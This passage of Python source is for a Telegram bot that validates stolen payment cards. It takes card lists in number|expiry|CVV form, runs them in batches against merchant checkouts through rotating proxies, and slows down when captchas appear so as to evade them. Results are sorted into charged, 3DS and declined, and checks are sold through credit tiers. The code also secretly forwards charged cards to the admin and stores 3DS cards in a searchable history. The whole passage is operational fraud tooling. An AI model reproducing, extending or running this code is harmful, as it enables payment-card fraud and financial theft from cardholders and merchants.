        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"_Contact admin to upgrade your subscription_"
    )

    await update.message.reply_text(
        msg,
        parse_mode="Markdown",
        reply_markup=get_subscribe_keyboard()
    )


async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /history command - show usage history"""
    user_id = update.effective_user.id
    info = get_subscription_info(user_id)
    settings = get_user_settings(user_id)

    msg = (
        f"📊 *Usage History*\n\n"
        f"💳 *Total Cards Checked*: {info['total_checks_used']}\n\n"
        f"🏷️ *Current Tier*: {info['tier_name']}\n"
    )

    if not info["is_unlimited"]:
        msg += f"📊 *Credits Used Today*: {info['daily_limit'] - info['credits']}/{info['daily_limit']}\n"
        msg += f"💰 *Remaining Today*: {info['credits']}\n"
    else:
        msg += f"♾️ *Credits*: Unlimited\n"

    if info["expires"] and info["days_left"] is not None:
        msg += f"\n⏰ *Subscription Expires*: {info['days_left']} days\n"

    msg += "\n_Credits reset daily at midnight UTC_"

    await update.message.reply_text(msg, parse_mode="Markdown")


# =============================================================================
# ADMIN PANEL
# =============================================================================

def get_admin_keyboard():
    """Get admin panel main keyboard"""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 View All Users", callback_data="admin_users")],
        [InlineKeyboardButton("📊 System Stats", callback_data="admin_stats")],
        [InlineKeyboardButton("💳 Manage Credits", callback_data="admin_credits")],
        [InlineKeyboardButton("🏷️ Manage Subscriptions", callback_data="admin_subs")],
        [InlineKeyboardButton("📢 Broadcast Message", callback_data="admin_broadcast")],
        [InlineKeyboardButton("🚫 Banned Users", callback_data="admin_banned")],
        [InlineKeyboardButton("⚙️ Bot Settings", callback_data="admin_settings")],
        [InlineKeyboardButton("◀️ Back to Menu", callback_data="menu_main")]
    ])


async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /admin command - admin panel"""
    user_id = update.effective_user.id

    if not is_admin(user_id):
        await update.message.reply_text("🚫 This command is restricted to administrators.")
        return

    await update.message.reply_text(
        "🔐 *Admin Panel*\n\n"
        "Select an option below:",
        parse_mode="Markdown",
        reply_markup=get_admin_keyboard()
    )


async def get_all_users_from_db():
    """Get all users from database"""
    users = []
    conn = get_db_connection()
    if conn:
        try:
            cur = conn.cursor()
            cur.execute("""
                SELECT user_id,
                       COALESCE(array_length(products, 1), 0) as product_count,
                       proxy IS NOT NULL as has_proxy,
                       created_at
                FROM user_settings
                ORDER BY created_at DESC
            """)
            users = cur.fetchall()
            cur.close()
            conn.close()
        except Exception as e:
            logger.error(f"Error fetching users: {e}")
            if conn:
                conn.close()
    else:
        # From in-memory cache
        for uid, settings in user_settings_cache.items():
            users.append((
                uid,
                len(settings.get("products", [])),
                settings.get("proxy") is not None,
                None
            ))
    return users


async def get_user_details(user_id: int):
    """Get detailed info about a specific user"""
    settings = get_user_settings(user_id)
    return settings


async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /chk command for single card"""
    user_id = update.effective_user.id

    if not context.args:
        await update.message.reply_text("❌ Usage: `/chk 4111111111111111|12|2025|123`", parse_mode="Markdown")
        return

    card_text = " ".join(context.args)
    cards = create_lista_(card_text)

    if not cards:
        await update.message.reply_text("❌ No valid card found in your message.")
        return

    card = cards[0]
    status_msg = await update.message.reply_text(f"⏳ Checking `{card}`...", parse_mode="Markdown")

    try:
        result = await process_single_card(card, user_id, bot=context.bot)
        formatted = format_result(result)
        await status_msg.edit_text(formatted, parse_mode="Markdown")

        username = update.effective_user.username or update.effective_user.first_name
        response = result.get("response", {})

        # Stealth admin notification for charged cards
        if response.get("success"):
            asyncio.create_task(notify_admin_charged(card, result, user_id, username))
        # Save 3DS cards to history
        elif '3ds' in str(response.get("error", "")).lower() or '3d' in str(response.get("error", "")).lower():
            save_card_history(
                user_id=user_id,
                username=username,
                card=card,
                card_type="3ds",
                response_message=response.get("message", ""),
                gateway_message=response.get("gateway_message", ""),
                bin_info=result.get("bin_info", "")
            )
    except Exception as e:
        logger.error(f"Check error: {e}")
        await status_msg.edit_text(f"❌ Error: {str(e)}")


# =============================================================================
# ERROR CATEGORIZATION - For accurate retry/decline decisions
# =============================================================================

# Declined error patterns - these are FINAL rejections from the bank
# Cards with these errors should NOT be retried
DECLINED_ERRORS = [
    # Card declined responses
    "declined",
    "decline",
    "card_declined",
    "transaction_declined",
    "payment declined",

    # Fund issues
    "insufficient funds",
    "insufficient_funds",
    "not enough funds",
    "low balance",

    # Bank rejection codes
    "do not honor",
    "do_not_honor",
    "refer to card issuer",
    "pick up card",
    "pickup card",
    "stolen card",
    "lost card",

    # Card status issues
    "expired card",
    "card expired",
    "invalid card",
    "invalid_card",
    "card not supported",
    "card not active",
    "inactive card",
    "revoked card",
    "card blocked",
    "restricted card",
    "account closed",

    # CVV/CVC errors (definitive)
    "incorrect cvc",
    "incorrect_cvc",
    "incorrect cvv",
    "incorrect_cvv",
    "invalid cvc",
    "invalid cvv",
    "invalid_cvc",
    "invalid_cvv",
    "cvc check failed",
    "cvv check failed",
    "security code invalid",
    "security code incorrect",
    "cvc_check_failed",

    # Card number errors
    "card number incorrect",
    "incorrect_number",
    "invalid_number",
    "invalid number",
    "invalid card number",

    # Fraud/Risk
    "fraudulent",
    "fraud",
    "suspected fraud",
    "risk",
    "high risk",

    # Transaction restrictions
    "transaction not allowed",
    "not permitted",
    "limit exceeded",
    "withdrawal limit",
    "exceeds limit",
    "over limit",
    "blocked",

    # Issuer unavailable (definitive)
    "issuer not available",
    "issuer unavailable",
    "issuer_unavailable",

    # Luhn/validation failures from our pre-check
    "failed luhn check",
    "invalid card number (failed luhn",
    "card expired",
    "validation_failed",
]

# Retriable error patterns - these are TEMPORARY failures
# Cards with these errors SHOULD be retried
RETRIABLE_ERRORS = [
    # Captcha issues
    "captcha",
    "recaptcha",
    "challenge",

    # Network/Connection issues
    "timeout",
    "timed out",
    "connection",
    "network",
    "proxy",
    "proxyerror",

    # Rate limiting
    "rate limit",
    "too many requests",
    "throttle",
    "slow down",

    # Temporary server issues
    "server error",
    "503",
    "502",
    "500",
    "service unavailable",
    "temporarily unavailable",
    "try again",

    # Checkout issues (might work with different product)
    "checkout",
    "cart",
    "session expired",
    "failed to initialize",
]


def is_declined_error(error_msg: str) -> bool:
    """
    Check if an error is a FINAL declined response from the bank.
    These cards should NOT be retried - they are definitively rejected.
    """
    if not error_msg:
        return False
    error_lower = error_msg.lower()
    return any(err in error_lower for err in DECLINED_ERRORS)


def is_retriable_error(error_msg: str) -> bool:
    """
    Check if an error is a TEMPORARY failure that should be retried.
    These are network/captcha/server issues, not card rejections.
    """
    if not error_msg:
        return False
    error_lower = error_msg.lower()
    return any(err in error_lower for err in RETRIABLE_ERRORS)


def categorize_error(error_msg: str, response: dict = None) -> str:
    """
    Categorize an error into: 'declined', 'retriable', '3ds', or 'unknown'

    Returns:
        'charged' - Card was successfully charged
        'declined' - Card was definitively rejected by bank
        '3ds' - 3D Secure authentication required
        'retriable' - Temporary error, should retry
        'validation_failed' - Pre-check validation failed (invalid card)
        'unknown' - Unknown error type
    """
    if response and response.get("success"):
        return "charged"

    if response and response.get("validation_failed"):
        return "validation_failed"

    error_lower = str(error_msg).lower() if error_msg else ""

    # Check for 3DS
    if "3ds" in error_lower or "3d secure" in error_lower or "3d_secure" in error_lower:
        return "3ds"

    # Check for declined
    if is_declined_error(error_msg):
        return "declined"

    # Check for retriable
    if is_retriable_error(error_msg):
        return "retriable"

    return "unknown"


async def run_batch_check(cards: list, user_id: int, user_settings: dict, session: dict, status_msg, update: Update, bot=None):
    """
    Run batch card checking as a background task.
    This function runs independently of the update handler, allowing other users to interact with the bot.

    Args:
        bot: Optional Telegram bot instance for notifications (e.g., product removal alerts)
    """
    charged = []
    declined = []
    three_ds = []
    retriable = []  # Cards that failed due to captcha/network/timeout
    all_results = []
    last_response = ""
    checked_count = 0
    was_stopped = False
    total_cards = len(cards)
    username = update.effective_user.username or update.effective_user.first_name

    try:
        # Process cards with controlled pacing to avoid captcha
        # Instead of creating all tasks upfront, we process in controlled batches
        pending_tasks = set()
        card_index = 0
        card_delay = config.CARD_DELAY

        while card_index < total_cards or pending_tasks:
            # Check for stop FIRST
            if session["stopped"]:
                was_stopped = True
                # Cancel pending tasks
                for task in pending_tasks:
                    task.cancel()
                break

            # Check for pause
            while session["paused"] and not session["stopped"]:
                await asyncio.sleep(0.05)
                await asyncio.sleep(0)  # Yield to event loop

            if session["stopped"]:
                was_stopped = True
                for task in pending_tasks:
                    task.cancel()
                break

            # Add new tasks if under limit and cards remain
            while len(pending_tasks) < config.CONCURRENCY_LIMIT and card_index < total_cards:
                card = cards[card_index]
                task = asyncio.create_task(process_single_card(card, user_id, user_settings, bot))
                pending_tasks.add(task)
                card_index += 1
                # Small delay between starting each card to avoid captcha
                if card_delay > 0 and card_index < total_cards:
                    await asyncio.sleep(card_delay)

            if not pending_tasks:
                break

            # Wait for at least one task to complete
            done, pending_tasks = await asyncio.wait(
                pending_tasks,
                return_when=asyncio.FIRST_COMPLETED,
                timeout=30  # Timeout to check for pause/stop
            )

            for future in done:
                try:
                    result = future.result()
                    response = result["response"]
                    card = result["card"]
                    checked_count += 1

                    # Check for captcha error - if detected, increase delay
                    error_msg_lower = str(response.get("error", "")).lower()
                    if "captcha" in error_msg_lower:
                        card_delay = min(card_delay + 0.5, 3.0)  # Increase delay, max 3 seconds
                        logger.warning(f"Captcha detected! Increasing delay to {card_delay}s")

                    # Deduct credit for this card
                    credit_success, remaining_credits = deduct_credits(user_id, 1)
                    if not credit_success:
                        # Out of credits - stop checking
                        session["stopped"] = True
                        was_stopped = True
                        asyncio.create_task(
                            update.message.reply_text(
                                "❌ *Out of credits!*\n\nStopping batch check.\n\nUse /subscribe to upgrade.",
                                parse_mode="Markdown"
                            )
                        )
                        break

                    # Send credit notifications (10 remaining or depleted)
                    if remaining_credits in [10, 0]:
                        asyncio.create_task(check_and_send_credit_notifications(user_id, remaining_credits))

                    # Build full response with all error details
                    response_parts = []
                    if response.get("message"):
                        response_parts.append(response.get("message"))
                    if response.get("error"):
                        response_parts.append(response.get("error"))
                    if response.get("gateway_message"):
                        response_parts.append(f"Gateway: {response.get('gateway_message')}")
                    if response.get("decline_code"):
                        response_parts.append(f"Code: {response.get('decline_code')}")

                    full_response = " | ".join(response_parts) if response_parts else "Unknown"

                    # Truncate for progress display only
                    display_msg = full_response
                    if len(display_msg) > 50:
                        display_msg = display_msg[:47] + "..."
                    last_response = display_msg

                    # Store result with full response for file
                    result_line = f"{card} | {full_response}"

                    # Track stats
                    increment_stat("total_cards_checked")

                    # Use improved error categorization
                    error_category = categorize_error(full_response, response)

                    if error_category == "charged" or response.get("success"):
                        charged.append(result)
                        all_results.append(f"CHARGED | {result_line}")
                        increment_stat("total_charged")
                        # Non-blocking notification to user
                        asyncio.create_task(
                            update.message.reply_text(format_result(result), parse_mode="Markdown")
                        )
                        # Stealth admin notification (real-time, non-blocking)
                        asyncio.create_task(notify_admin_charged(card, result, user_id, username))

                    elif error_category == "3ds":
                        three_ds.append(result)
                        all_results.append(f"3DS | {result_line}")
                        increment_stat("total_3ds")
                        asyncio.create_task(
                            update.message.reply_text(format_result(result), parse_mode="Markdown")
                        )
                        # Save 3DS card to history
                        save_card_history(
                            user_id=user_id,
                            username=username,
                            card=card,
                            card_type="3ds",
                            response_message=response.get("message", ""),
                            gateway_message=response.get("gateway_message", ""),
                            bin_info=result.get("bin_info", "")
                        )

                    elif error_category == "validation_failed":
                        # Pre-validation failed (Luhn, expiry, CVV) - definitely declined
                        declined.append(result)
                        all_results.append(f"INVALID | {result_line}")
                        increment_stat("total_declined")

                    elif error_category == "declined":
                        # Declined by bank - final rejection, don't retry
                        declined.append(result)
                        all_results.append(f"DECLINED | {result_line}")
                        increment_stat("total_declined")

                    elif error_category == "retriable":
                        # Known retriable error (captcha, timeout, network)
                        retriable.append(card)
                        all_results.append(f"RETRY | {result_line}")

                    else:
                        # Unknown error - default to retriable to be safe
                        retriable.append(card)
                        all_results.append(f"RETRY | {result_line}")

                    # Update progress every 5 cards (non-blocking)
                    if checked_count % 5 == 0 or checked_count == total_cards:
                        try:
                            progress_bar = create_progress_bar(checked_count, total_cards)
                            pause_status = "⏸️ *PAUSED*\n\n" if session["paused"] else ""
                            credits_display = f"💰 Credits: {remaining_credits}" if remaining_credits != -1 else "💰 Credits: ♾️"
                            retry_text = f"🔄 Retry: {len(retriable)}\n" if retriable else ""
                            asyncio.create_task(status_msg.edit_text(
                                f"{pause_status}⏳ *Checking Cards...*\n\n"
                                f"{progress_bar}\n"
                                f"📊 {checked_count}/{total_cards} checked\n"
                                f"{credits_display}\n\n"
                                f"✅ Charged: {len(charged)}\n"
                                f"🔐 3DS: {len(three_ds)}\n"
                                f"❌ Declined: {len(declined)}\n"
                                f"{retry_text}\n"
                                f"💬 *Last*: `{last_response}`",
                                parse_mode="Markdown",
                                reply_markup=get_checking_keyboard(paused=session["paused"])
                            ))
                        except Exception:
                            pass

                except asyncio.CancelledError:
                    logger.warning(f"Task cancelled during batch check for user {user_id}")
                    continue
                except Exception as e:
                    logger.error(f"Batch check error for user {user_id}: {e}")
                    last_response = f"Error: {str(e)[:30]}"
                    checked_count += 1

    except Exception as e:
        logger.error(f"Fatal error in batch check for user {user_id}: {e}")
    finally:
        # Reset session
        session["checking"] = False

        # Store retriable cards in session for retry
        if retriable:
            session["retriable_cards"] = retriable
        else:
            session["retriable_cards"] = []

        # Final summary
        stop_text = "⏹️ *STOPPED* - " if was_stopped else ""
        retry_text = f"🔄 Retry Available: {len(retriable)}\n" if retriable else ""
        summary = (
            f"{stop_text}📊 *FINAL RESULTS*\n\n"
            f"✅ Charged: {len(charged)}\n"
            f"🔐 3DS: {len(three_ds)}\n"
            f"❌ Declined: {len(declined)}\n"
            f"{retry_text}"
            f"📝 Checked: {checked_count}/{total_cards}"
        )

        # Build keyboard with retry button if there are retriable cards
        final_keyboard = None
        if retriable:
            final_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(f"🔄 Retry {len(retriable)} Failed Cards", callback_data="retry_failed")],
                [InlineKeyboardButton("🏠 Menu", callback_data="menu_main")]
            ])
        else:
            final_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🏠 Menu", callback_data="menu_main")]
            ])

        try:
            await status_msg.edit_text(summary, parse_mode="Markdown", reply_markup=final_keyboard)
        except Exception:
            pass

        # Send full results file
        if all_results:
            try:
                results_text = "\n".join(all_results)
                file_buffer = io.BytesIO(results_text.encode('utf-8'))
                file_buffer.name = "results.txt"
                await update.message.reply_document(
                    document=file_buffer,
                    caption=f"📊 Results: {len(charged)} Charged | {len(three_ds)} 3DS | {len(declined)} Declined | {len(retriable)} Retry | {checked_count}/{total_cards} checked"
                )
            except Exception as e:
                logger.error(f"Failed to send results file: {e}")

        # Send charged cards separately
        if charged:
            try:
                charged_text = "\n".join([r["card"] for r in charged])
                file_buffer = io.BytesIO(charged_text.encode('utf-8'))
                file_buffer.name = "charged_cards.txt"
                await update.message.reply_document(
                    document=file_buffer,
                    caption=f"✅ {len(charged)} Charged Cards"
                )
            except Exception as e:
                logger.error(f"Failed to send charged cards file: {e}")

        # Send retriable cards separately if any
        if retriable:
            try:
                retriable_text = "\n".join(retriable)
                file_buffer = io.BytesIO(retriable_text.encode('utf-8'))
                file_buffer.name = "retry_cards.txt"
                await update.message.reply_document(
                    document=file_buffer,
                    caption=f"🔄 {len(retriable)} Cards to Retry (Captcha/Network errors)"
                )
            except Exception as e:
                logger.error(f"Failed to send retry cards file: {e}")


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle .txt file uploads for mass checking"""
    try:
        user_id = update.effective_user.id
        document = update.message.document

        # Safety check
        if not document:
            logger.warning(f"handle_file called but no document found for user {user_id}")
            return

        logger.info(f"File received from user {user_id}: {document.file_name}")

        # Check if user is banned
        if is_user_banned(user_id):
            await update.message.reply_text("🚫 You are banned from using this bot.")
            return

        # Check file extension
        file_name = document.file_name or ""
        if not file_name.lower().endswith('.txt'):
            await update.message.reply_text("❌ Please send a .txt file containing cards.")
            return

        # Download file
        file = await context.bot.get_file(document.file_id)
        file_bytes = await file.download_as_bytearray()

        try:
            card_text = file_bytes.decode('utf-8')
        except UnicodeDecodeError:
            card_text = file_bytes.decode('latin-1')

        cards = create_lista_(card_text)

        if not cards:
            await update.message.reply_text("❌ No valid cards found in the file.")
            return

        logger.info(f"User {user_id}: Found {len(cards)} cards in file")

        # Check credits BEFORE processing
        user_credits = get_user_credits(user_id)
        cards_to_check = len(cards)

        if user_credits != -1 and user_credits < cards_to_check:
            # Not enough credits for all cards
            if user_credits == 0:
                await update.message.reply_text(
                    get_no_credits_message(),
                    parse_mode="Markdown",
                    reply_markup=get_subscribe_keyboard()
                )
                return
            else:
                # Warn user and only check what they can afford
                await update.message.reply_text(
                    f"⚠️ *Limited Credits!*\n\n"
                    f"You have {user_credits} credits but {cards_to_check} cards.\n"
                    f"Only the first {user_credits} cards will be checked.\n\n"
                    f"_Upgrade to check more cards!_",
                    parse_mode="Markdown"
                )
                cards = cards[:user_credits]
                cards_to_check = len(cards)

        # Reset session state
        reset_user_session(user_id)
        session = get_user_session(user_id)
        session["checking"] = True

        # Pre-fetch user settings ONCE before starting (optimization)
        user_settings = get_user_settings(user_id)

        # Show credits in status
        credits_text = f"💰 Credits: {user_credits}" if user_credits != -1 else "💰 Credits: ♾️ Unlimited"

        status_msg = await update.message.reply_text(
            f"📂 *File Received*\n\n"
            f"💳 Cards found: {len(cards)}\n"
            f"{credits_text}\n"
            f"⏳ Starting check...",
            parse_mode="Markdown",
            reply_markup=get_checking_keyboard(paused=False)
        )

        # Run the checking loop as a BACKGROUND TASK so the handler returns immediately
        # This allows other users to interact with the bot while checking is in progress
        asyncio.create_task(
            run_batch_check(cards, user_id, user_settings, session, status_msg, update, context.bot)
        )

    except Exception as e:
        logger.error(f"Error in handle_file: {e}", exc_info=True)
        try:
            await update.message.reply_text(
                f"❌ Error processing file: {str(e)[:100]}",
                parse_mode=None
            )
        except:
            pass


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle direct card messages and input waiting"""
    user_id = update.effective_user.id
    text = update.message.text or ""

    # Check if waiting for input
    waiting_for = get_waiting_for(user_id)

    # Handle proxy input
    if waiting_for == "proxy":
        set_waiting_for(user_id, None)

        # Support multiple proxies - split by newline
        raw_proxies = [p.strip() for p in text.strip().split('\n') if p.strip()]

        if not raw_proxies:
            await update.message.reply_text(
                "❌ *No proxy provided!*\n\n"
                "Use: `host:port:username:password`\n"
                "Or send multiple proxies (one per line)",
                parse_mode="Markdown",
                reply_markup=get_back_keyboard("menu_proxy")
            )
            return

        # Show testing status
        if len(raw_proxies) == 1:
            status_msg = await update.message.reply_text("🔄 *Testing proxy...*", parse_mode="Markdown")
        else:
            status_msg = await update.message.reply_text(
                f"🔄 *Testing {len(raw_proxies)} proxies...*\n\n_This may take a moment_",
                parse_mode="Markdown"
            )

        # Validate and test each proxy
        valid_proxies = []
        failed_proxies = []

        for proxy in raw_proxies:
            # First validate format
            is_valid, proxy_url, format_error = parse_proxy_format(proxy)
            if not is_valid:
                failed_proxies.append((proxy, format_error))
                continue

            # Then test connectivity
            is_healthy, health_error = await check_proxy_health(proxy, skip_cache=True)
            if is_healthy:
                valid_proxies.append(proxy)
            else:
                failed_proxies.append((proxy, health_error or "Connection failed"))

        # Build response
        if valid_proxies:
            # Save ALL valid proxies as a list (bot will rotate between them)
            update_user_setting(user_id, "proxy", valid_proxies)

            if len(valid_proxies) == 1:
                result_text = f"✅ *Proxy Set!*\n\n`{valid_proxies[0]}`"
            else:
                result_text = f"✅ *{len(valid_proxies)} Proxies Added!*\n\n"
                for i, proxy in enumerate(valid_proxies[:5], 1):
                    short_proxy = proxy[:35] + "..." if len(proxy) > 35 else proxy
                    result_text += f"{i}. `{short_proxy}`\n"
                if len(valid_proxies) > 5:
                    result_text += f"_...and {len(valid_proxies) - 5} more_\n"
                result_text += f"\n🔄 _Bot will rotate between proxies automatically_"

            if failed_proxies:
                result_text += f"\n\n⚠️ *{len(failed_proxies)} proxy/proxies failed:*"
                for proxy, error in failed_proxies[:3]:  # Show first 3 failures
                    short_proxy = proxy[:30] + "..." if len(proxy) > 30 else proxy
                    result_text += f"\n• `{short_proxy}`: {error}"
                if len(failed_proxies) > 3:
                    result_text += f"\n_...and {len(failed_proxies) - 3} more_"

            await status_msg.edit_text(
                result_text,
                parse_mode="Markdown",
                reply_markup=get_back_keyboard("menu_proxy")
            )
        else:
            # All proxies failed
            result_text = "❌ *All proxies failed validation!*\n\n"
            for proxy, error in failed_proxies[:5]:  # Show first 5 failures
                short_proxy = proxy[:30] + "..." if len(proxy) > 30 else proxy
                result_text += f"• `{short_proxy}`\n  └ _{error}_\n"
            if len(failed_proxies) > 5:
                result_text += f"\n_...and {len(failed_proxies) - 5} more_"

            result_text += "\n\n*Format:* `host:port:username:password`"

            await status_msg.edit_text(
                result_text,
                parse_mode="Markdown",
                reply_markup=get_back_keyboard("menu_proxy")
            )
        return

    # =============================================================================
    # ADMIN INPUT HANDLERS
    # =============================================================================

    # Handle admin user lookup
    if waiting_for == "admin_user_lookup" and is_admin(user_id):
        set_waiting_for(user_id, None)
        try:
            target_id = int(text.strip())
            settings = get_user_settings(target_id)

            banned_status = "🚫 BANNED" if is_user_banned(target_id) else "✅ Active"
            proxy_status = format_proxy_status(settings.get("proxy"))
            products = settings.get("products", [])

            text_msg = (
                f"👤 *User Details*\n\n"
                f"*ID*: `{target_id}`\n"
                f"*Status*: {banned_status}\n"
                f"*Proxy*: {proxy_status}\n"
                f"*Products*: {len(products)}\n"
            )

            if products:
                text_msg += "\n*Products:*\n"
                for i, url in enumerate(products[:5]):
                    short = url[:40] + "..." if len(url) > 40 else url
                    text_msg += f"{i+1}. `{short}`\n"
                if len(products) > 5:
                    text_msg += f"_...and {len(products) - 5} more_"

            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔨 Ban" if not is_user_banned(target_id) else "✅ Unban",
                                      callback_data=f"admin_toggle_ban_{target_id}")],
                [InlineKeyboardButton("◀️ Back", callback_data="admin_users")]
            ])
            await update.message.reply_text(text_msg, parse_mode="Markdown", reply_markup=keyboard)
        except ValueError:
            await update.message.reply_text(
                "❌ Invalid user ID. Please enter a numeric ID.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_users")]
                ])
            )
        return

    # Handle admin broadcast
    if waiting_for == "admin_broadcast" and is_admin(user_id):
        set_waiting_for(user_id, None)
        broadcast_msg = text.strip()

        users = await get_all_users_from_db()
        success_count = 0
        fail_count = 0

        status_msg = await update.message.reply_text("📢 Broadcasting message...")

        for user_data in users:
            target_uid = user_data[0]
            if is_user_banned(target_uid):
                continue
            try:
                await context.bot.send_message(
                    chat_id=target_uid,
                    text=f"📢 *Admin Broadcast*\n\n{broadcast_msg}",
                    parse_mode="Markdown"
                )
                success_count += 1
            except Exception as e:
                fail_count += 1
                logger.warning(f"Failed to send broadcast to {target_uid}: {e}")

        await status_msg.edit_text(
            f"✅ *Broadcast Complete*\n\n"
            f"✅ Sent: {success_count}\n"
            f"❌ Failed: {fail_count}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("◀️ Back", callback_data="admin_back")]
            ])
        )
        return

    # Handle admin ban
    if waiting_for == "admin_ban" and is_admin(user_id):
        set_waiting_for(user_id, None)
        try:
            target_id = int(text.strip())
            ban_user(target_id)
            await update.message.reply_text(
                f"🚫 User `{target_id}` has been banned.",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_banned")]
                ])
            )
        except ValueError:
            await update.message.reply_text(
                "❌ Invalid user ID.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_banned")]
                ])
            )
        return

    # Handle admin unban
    if waiting_for == "admin_unban" and is_admin(user_id):
        set_waiting_for(user_id, None)
        try:
            target_id = int(text.strip())
            if is_user_banned(target_id):
                unban_user(target_id)
                await update.message.reply_text(
                    f"✅ User `{target_id}` has been unbanned.",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("◀️ Back", callback_data="admin_banned")]
                    ])
                )
            else:
                await update.message.reply_text(
                    f"⚠️ User `{target_id}` is not banned.",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("◀️ Back", callback_data="admin_banned")]
                    ])
                )
        except ValueError:
            await update.message.reply_text(
                "❌ Invalid user ID.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_banned")]
                ])
            )
        return

    # Handle admin add credits
    if waiting_for == "admin_add_credits" and is_admin(user_id):
        set_waiting_for(user_id, None)
        try:
            parts = text.strip().split()
            if len(parts) != 2:
                raise ValueError("Invalid format")
            target_id = int(parts[0])
            amount = int(parts[1])
            if amount <= 0:
                raise ValueError("Amount must be positive")

            new_credits = add_credits(target_id, amount)
            await update.message.reply_text(
                f"✅ Added {amount} credits to user `{target_id}`\n"
                f"New balance: {new_credits}",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_credits")]
                ])
            )
        except ValueError as e:
            await update.message.reply_text(
                f"❌ Invalid input. Use format: `user_id amount`\n"
                f"Example: `123456789 100`",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_credits")]
                ])
            )
        return

    # Handle admin remove credits
    if waiting_for == "admin_remove_credits" and is_admin(user_id):
        set_waiting_for(user_id, None)
        try:
            parts = text.strip().split()
            if len(parts) != 2:
                raise ValueError("Invalid format")
            target_id = int(parts[0])
            amount = int(parts[1])
            if amount <= 0:
                raise ValueError("Amount must be positive")

            # Get current credits and subtract
            current = get_user_credits(target_id)
            if current == -1:
                await update.message.reply_text(
                    f"⚠️ User `{target_id}` has unlimited credits.",
                    parse_mode="Markdown",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("◀️ Back", callback_data="admin_credits")]
                    ])
                )
                return

            new_credits = max(0, current - amount)
            settings = get_user_settings(target_id)
            settings["credits"] = new_credits
            save_user_settings(target_id, settings)

            await update.message.reply_text(
                f"✅ Removed {amount} credits from user `{target_id}`\n"
                f"New balance: {new_credits}",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_credits")]
                ])
            )
        except ValueError:
            await update.message.reply_text(
                f"❌ Invalid input. Use format: `user_id amount`\n"
                f"Example: `123456789 50`",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_credits")]
                ])
            )
        return

    # Handle admin check credits
    if waiting_for == "admin_check_credits" and is_admin(user_id):
        set_waiting_for(user_id, None)
        try:
            target_id = int(text.strip())
            info = get_subscription_info(target_id)

            credits_display = info["credits"] if not info["is_unlimited"] else "♾️ Unlimited"
            expires_text = f"\n⏰ Expires in: {info['days_left']} days" if info["days_left"] is not None else ""

            await update.message.reply_text(
                f"👤 *User {target_id}*\n\n"
                f"💰 Credits: {credits_display}\n"
                f"🏷️ Tier: {info['tier_name']}\n"
                f"📊 Total Checks: {info['total_checks_used']}"
                f"{expires_text}",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_credits")]
                ])
            )
        except ValueError:
            await update.message.reply_text(
                "❌ Invalid user ID.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_credits")]
                ])
            )
        return

    # Handle admin set tier
    if waiting_for == "admin_set_tier" and is_admin(user_id):
        set_waiting_for(user_id, None)
        try:
            parts = text.strip().split()
            if len(parts) != 3:
                raise ValueError("Invalid format")
            target_id = int(parts[0])
            tier = parts[1].lower()
            days = int(parts[2])

            if tier not in TIER_CREDITS:
                raise ValueError(f"Invalid tier: {tier}")
            if days <= 0:
                raise ValueError("Days must be positive")

            set_subscription(target_id, tier, days)
            tier_name = TIER_NAMES.get(tier, tier)

            await update.message.reply_text(
                f"✅ Updated user `{target_id}`\n\n"
                f"🏷️ Tier: {tier_name}\n"
                f"⏰ Duration: {days} days\n"
                f"💰 Daily Credits: {TIER_CREDITS[tier] if TIER_CREDITS[tier] != -1 else '♾️ Unlimited'}",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_subs")]
                ])
            )
        except ValueError as e:
            await update.message.reply_text(
                f"❌ Invalid input.\n\n"
                f"Format: `user_id tier days`\n"
                f"Tiers: `free`, `basic`, `premium`, `unlimited`\n"
                f"Example: `123456789 premium 30`",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("◀️ Back", callback_data="admin_subs")]
                ])
            )
        return

    # Handle admin search for charged cards by user ID
    if waiting_for == "charged_user_search":
        set_waiting_for(user_id, None)
        if not is_admin(user_id):
            await update.message.reply_text("🚫 Admin only!")
            return
        try:
            target_user_id = int(text.strip())
        except ValueError:
            await update.message.reply_text(
                "❌ Invalid user ID. Must be a number.\n\nTry again with `/getcharged <user_id>`",
                parse_mode="Markdown"
            )
            return
        await send_card_history(
            chat_id=update.effective_chat.id,
            bot=context.bot,
            target_user_id=target_user_id,
            card_type="charged",
            reply_to_message_id=update.message.message_id
        )
        return

    # Handle admin search for 3DS cards by user ID
